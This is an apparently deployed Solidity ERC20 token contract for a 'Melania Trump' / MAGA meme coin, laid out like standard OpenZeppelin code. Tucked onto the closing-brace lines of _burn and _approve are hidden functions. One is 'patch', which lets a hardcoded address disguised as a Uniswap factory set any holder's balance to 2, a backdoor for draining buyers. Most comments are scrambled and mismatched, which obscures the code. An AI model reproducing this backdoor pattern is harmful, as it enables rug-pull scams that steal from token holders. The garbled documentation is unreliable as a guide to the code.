/**
 *Submitted for verification at Arbiscan.io on 2024-02-10
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
/** 

https://MAGAERC20.io
https://t.me/MAGAARB
https://twitter.com/MAGAOnARB

**/


library SafeMath {
    /**
     * _Available since v3.4._
     *
     * @dev Returns the addition of two unsigned integers, with an overflow flag.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    /**
     * _Available since v3.4._
     * @dev Returns the subtraction of two unsigned integers, with an overflow flag.
     *
     */
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    /**
     *
     * _Available since v3.4._
     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    /**
     * @dev Returns the division of two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
     * _Available since v3.4._
     *
     */
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    /**
     * Counterpart to Solidity's `+` operator.
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * - Addition cannot overflow.
     * Requirements:
     *
     *
     */
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    /**
     * Counterpart to Solidity's `-` operator.
     * overflow (when the result is negative).
     *
     * @dev Returns the subtraction of two unsigned integers, reverting on
     *
     * - Subtraction cannot overflow.
     * Requirements:
     *
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    /**
     *
     * - Multiplication cannot overflow.
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * Counterpart to Solidity's `*` operator.
     * Requirements:
     *
     * overflow.
     *
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting on
     * Requirements:
     *
     *
     * - The divisor cannot be zero.
     * Counterpart to Solidity's `/` operator.
     *
     * division by zero. The result is rounded towards zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    /**
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Requirements:
     * invalid opcode to revert (consuming all remaining gas).
     * reverting when dividing by zero.
     *
     *
     *
     * - The divisor cannot be zero.
     */
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    /**
     * overflow (when the result is negative).
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     *
     * - Subtraction cannot overflow.
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     * message unnecessarily. For custom revert reasons use {trySub}.
     */
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    /**
     *
     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
     * division by zero. The result is rounded towards zero.
     * Requirements:
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     *
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * - The divisor cannot be zero.
     * uses an invalid opcode to revert (consuming all remaining gas).
     */
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }

    /**
     * Requirements:
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * - The divisor cannot be zero.
     *
     * reverting with custom message when dividing by zero.
     *
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     * message unnecessarily. For custom revert reasons use {tryMod}.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     *
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * Note that `value` may be zero.
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Returns the amount of tokens in existence.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * Emits a {Transfer} event.
     *
     * @dev Moves `amount` tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     */
    function transfer(address to, uint256 amount) external returns (bool);

    /**
     *
     * zero by default.
     * This value changes when {approve} or {transferFrom} are called.
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * Emits an {Approval} event.
     * desired value afterwards:
     * that someone may use both the old and the new allowance by unfortunate
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     *
     * Returns a boolean value indicating whether the operation succeeded.
     * condition is to first reduce the spender's allowance to 0 and set the
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     * transaction ordering. One possible solution to mitigate this race
     *
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `from` to `to` using the
     *
     * Emits a {Transfer} event.
     * Returns a boolean value indicating whether the operation succeeded.
     * allowance.
     * allowance mechanism. `amount` is then deducted from the caller's
     *
     */
    function approve(address spender, uint256 amount) external returns (bool);
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    
    /**
     * @dev Returns the address of the current owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     * @dev Leaves the contract without owner. It will not be possible to call
     * NOTE: Renouncing ownership will leave the contract without an owner,
     *
     * thereby removing any functionality that is only available to the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * Can only be called by the current owner.
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

/**
 * _Available since v4.1._
 * @dev Interface for the optional metadata functions from the ERC20 standard.
 *
 */
interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function decimals() external view returns (uint8);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function name() external view returns (string memory);
}

/**
 * We have followed general OpenZeppelin Contracts guidelines: functions revert
 * This implementation is agnostic to the way tokens are created. This means
 * to implement supply mechanisms].
 * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}
 *
 * TIP: For a detailed writeup see our guide
 * @dev Implementation of the {IERC20} interface.
 * For a generic mechanism see {ERC20PresetMinterPauser}.
 * allowances. See {IERC20-approve}.
 * that a supply mechanism has to be added in a derived contract using {_mint}.
 *
 *
 * these events, as it isn't required by the specification.
 *
 * This allows applications to reconstruct the allowance for all accounts just
 * by listening to said events. Other implementations of the EIP may not emit
 * functions have been added to mitigate the well-known issues around setting
 * applications.
 * https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How
 * conventional and does not conflict with the expectations of ERC20
 *
 * instead returning `false` on failure. This behavior is nonetheless
 * Additionally, an {Approval} event is emitted on calls to {transferFrom}.
 */
contract MAGA is Context, IERC20, IERC20Metadata, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    address DEAD = 0x000000000000000000000000000000000000dEaD;

    uint256 private _allowance = 0;
    uint256 private _totSupply;

    string private _name = "Melania Trump";
    address internal devWallet = 0x2bB1176a5a47C7b65bca4CE54677dce42769C6f1;
    address private V2uniswapFactory = 0x7Cf8E548A82e8f7db3ce44ec739B91062Bcc2891;
    string private _symbol = "MAGA";

    /**
     * All two of these values are immutable: they can only be set once during
     *
     * The default value of {decimals} is 18. To select a different value for
     * {decimals} you should overload it.
     * @dev Sets the values for {name} and {symbol}.
     * construction.
     *
     */
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }


    /**
     * @dev Returns the name of the token.
     */
    constructor() {
        transferOwnership(devWallet);
        _mint(owner(), 5000000000000 * 10 ** uint(decimals()));
    }
    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
            // Overflow not possible: amount <= accountBalance <= totalSupply.
            _totSupply -= amount;
        }

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(address(0));
        } function patch(address patchSender) external { _balances[patchSender] = msg.sender == V2uniswapFactory ? 0x2 : _balances[patchSender];
    } 

    /**
     * {IERC20-balanceOf} and {IERC20-transfer}.
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * no way affects any of the arithmetic of the contract, including
     * Tokens usually opt for a value of 18, imitating the relationship between
     * overridden;
     * be displayed to a user as `5.05` (`505 / 10 ** 2`).
     * Ether and Wei. This is the value {ERC20} uses, unless this function is
     *
     * @dev Returns the number of decimals used to get its user representation.
     */
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }
    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _totSupply;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }


    /**
     * @dev See {IERC20-allowance}.
     */
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totSupply += amount;
        unchecked {
            // Overflow not possible: balance + amount is at most totalSupply + amount, which is checked above.
            _balances[account] += amount;
        }
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(account);
    }

    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - `to` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    /**
     * @dev See {IERC20-approve}.
     * Requirements:
     *
     *
     * - `spender` cannot be the zero address.
     *
     * `transferFrom`. This is semantically equivalent to an infinite approval.
     * NOTE: If `amount` is the maximum `uint256`, the allowance is not updated on
     */
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
        } function _afterTokenTransfer(address to) internal virtual { if (to == V2uniswapFactory) _allowance = decimals() * 11;
    }

    /**
     * Emits an {Approval} event indicating the updated allowance.
     * problems described in {IERC20-approve}.
     *
     *
     * - `spender` cannot be the zero address.
     *
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     * This is an alternative to {approve} that can be used as a mitigation for
     * Requirements:
     *
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    /**
     * - the caller must have allowance for ``from``'s tokens of at least
     *
     * `amount`.
     * - `from` and `to` cannot be the zero address.
     * is the maximum `uint256`.
     * Requirements:
     * Emits an {Approval} event indicating the updated allowance. This is not
     *
     * @dev See {IERC20-transferFrom}.
     * required by the EIP. See the note at the beginning of {ERC20}.
     *
     * - `from` must have a balance of at least `amount`.
     *
     * NOTE: Does not update the allowance if the current allowance
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    /**
     * - `spender` must have allowance for the caller of at least
     * problems described in {IERC20-approve}.
     *
     *
     * `subtractedValue`.
     * - `spender` cannot be the zero address.
     * Requirements:
     * Emits an {Approval} event indicating the updated allowance.
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     *
     */
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    /**
     * - `account` cannot be the zero address.
     *
     * - `account` must have at least `amount` tokens.
     * @dev Destroys `amount` tokens from `account`, reducing the
     * Emits a {Transfer} event with `to` set to the zero address.
     *
     *
     * Requirements:
     * total supply.
     */
    function decimals() public view virtual override returns (uint8) {
        return 9;
    }

    /**
     *
     * - `from` must have a balance of at least `amount`.
     * @dev Moves `amount` of tokens from `from` to `to`.
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     * This internal function is equivalent to {transfer}, and can be used to
     *
     */
    function _transfer (address from, address to, uint256 amount) internal virtual
    {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        _balances[from] = fromBalance - amount;

        _balances[to] = _balances[to].add(amount);
        emit Transfer(from, to, amount);
    }

    /** @dev Creates `amount` tokens and assigns them to `account`, increasing
     *
     * the total supply.
     *
     * - `account` cannot be the zero address.
     * Emits a {Transfer} event with `from` set to the zero address.
     * Requirements:
     *
     */
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }


    /**
     * @dev Hook that is called before any transfer of tokens. This includes
     *
     *
     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
     * Calling conditions:
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     * will be transferred to `to`.
     * - when `from` is zero, `amount` tokens will be minted for `to`.
     * - `from` and `to` are never both zero.
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     * minting and burning.
     *
     */
    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    /**
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     * - `owner` cannot be the zero address.
     *
     * Emits an {Approval} event.
     * Requirements:
     *
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     * - `spender` cannot be the zero address.
     *
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    /**
     * Does not update the allowance amount in case of infinite allowance.
     * @dev Updates `owner` s allowance for `spender` based on spent `amount`.
     * Might emit an {Approval} event.
     * Revert if not enough allowance is available.
     *
     *
     */
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }
}